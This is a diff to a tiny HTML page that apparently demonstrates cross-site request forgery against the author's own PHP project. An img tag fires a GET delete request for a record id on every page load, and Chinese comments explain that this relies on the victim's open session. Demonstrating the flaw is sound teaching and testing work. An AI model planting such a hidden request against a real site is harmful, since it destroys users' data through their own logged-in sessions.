@@ -1,10 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
+	<meta charset="utf-8">
 	<title>CSRF</title>
 </head>
 <body>
+	<!-- 前提是所要攻击的页面会话已经建立，没有断开时就可以进行CSRF攻击 -->
 <!-- CSRF攻击验证——页面刷新时,根据img标签的特性，每刷新一次页面就发起一次http请求，可对网站发起攻击 -->
- <img src="/PHPProjects/index.php?action=delete&id=58&page=3">
+ <img src="/PHPProjects/index.php?action=delete&id=69&page=1">
 </body>
-</html>>
+</html>
